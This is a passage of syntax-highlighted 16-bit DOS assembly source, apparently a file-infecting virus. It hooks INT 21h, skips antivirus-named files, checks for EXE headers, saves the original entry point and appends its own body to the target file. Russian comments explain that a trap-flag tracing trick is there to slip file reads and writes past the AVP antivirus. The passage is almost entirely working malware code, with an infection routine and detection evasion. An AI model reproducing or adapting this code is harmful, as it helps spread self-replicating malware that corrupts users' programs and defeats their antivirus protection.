</span><span class="sc5">trans</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">infect_file</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">notExec</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">@e1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">exit_0x21</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">addrOld21h</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Pong</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4321h</span><span class="sc0">
           </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">int01for21h</span><span class="sc4">:</span><span class="sc6">pushf</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0CCCCh</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exitfromint0x01</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int01for21h</span><span class="sc4">],</span><span class="sc2">0cfh</span><span class="sc0">
</span><span class="sc5">exitfromint0x01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">trac21h</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pushf</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">
            </span><span class="sc1">; set new int01</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3501h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ollds0x01</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc1">;save old 0x01</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ollds0x01</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
            </span><span class="sc1">; set to my 0x01</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2501h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int01for21h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ProcSetTF_1</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc0">
            </span><span class="sc6">popf</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">82h</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ProcSetTF_0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2501h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ollds0x01</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ollds0x01</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int01for21h</span><span class="sc4">],</span><span class="sc2">09ch</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc5">noFDD</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ollds0x01</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">olld0x24h</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">test_name</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">
 </span><span class="sc5">inc_di</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">inc_di</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">tablname</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'INF'</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WEB'</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AVP'</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'VER'</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AND'</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AIN'</span><span class="sc0">
</span><span class="sc5">tablname</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">test_name_</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">test_name_</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">test_name_</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">test_name_</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">test_name_</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">test_name_</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">OOO</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">test_name_</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">
           </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">OOO</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc1">;-- Infect file cs:0000 ----------------------</span><span class="sc0">
          </span><span class="sc1">; read corent atr</span><span class="sc0">
          </span><span class="sc1">; set 0x24</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">noFDD</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">test_name</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">olld0x24h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">olld0x24h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int24h</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fileATR</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">;save atr</span><span class="sc0">
          </span><span class="sc1">;set 20h atr</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
          </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">noerrors</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ErrorAcc</span><span class="sc0">
          </span><span class="sc1">;open file</span><span class="sc0">
</span><span class="sc5">noerrors</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">hendler</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0"> </span><span class="sc1">; read sec</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
          </span><span class="sc6">and</span><span class="sc0">  </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">
          </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">It_is_56sec</span><span class="sc0">
          </span><span class="sc1">;read headr</span><span class="sc0">
          </span><span class="sc1">;-------------------------------------</span><span class="sc0">
          </span><span class="sc1">; АВП очень скептечески относится к функции 3Fh INT 21h</span><span class="sc0">
          </span><span class="sc1">; поэтому пришлось извратиться</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">
           </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0CCCCH</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">03f00h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">hade_exe</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trac21h</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">61h</span><span class="sc0">
          </span><span class="sc1">;-------------------------------------</span><span class="sc0">
          </span><span class="sc1">;int int21h</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">hade_exe</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'MZ'</span><span class="sc0">
          </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">YesExe</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">It_is_56sec</span><span class="sc0"> </span><span class="sc1">; not exe</span><span class="sc0">
</span><span class="sc5">YesExe</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">randomaze</span><span class="sc0">
         </span><span class="sc1">;- Настройка хедера --</span><span class="sc0">
         </span><span class="sc1">;---- save oldIP,oldCS --------</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldIP__</span><span class="sc0">  </span><span class="sc1">;save CS:IP</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">ExeIP</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
          </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">ReloSS</span><span class="sc0">          </span><span class="sc1">; save SS:SP</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
          </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">
         </span><span class="sc1">;; to be continion</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Make_Vbady</span><span class="sc0">
          </span><span class="sc1">;---- Count chksum   -----------</span><span class="sc0">
          </span><span class="sc1">;-  получим размер ------------</span><span class="sc0">
           </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc5">hendler</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
           </span><span class="sc6">jg</span><span class="sc0">  </span><span class="sc5">It_is_56sec</span><span class="sc0">
          </span><span class="sc1">;-----------------------------------</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
          </span><span class="sc1">;---Дописываем bady ---------------</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">tonext</span><span class="sc0">
</span><span class="sc5">It_is_56sec</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">It_is_56sec2</span><span class="sc0">
</span><span class="sc5">tonext</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc1">; Функцию 40h АВП тоже не любит</span><span class="sc0">
            </span><span class="sc1">; чем больше СХ тем больше его ненависть.</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">hendler</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0CCCCH</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">04000h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@End</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">sizeV</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">desh_size</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trac21h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">61h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">shrdd</span><span class="sc0">
           </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">shldd</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ExeIP</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; new IP to EOF</span><span class="sc0">
</span><span class="sc1">;-------------Count ReloCS------------------</span><span class="sc0">
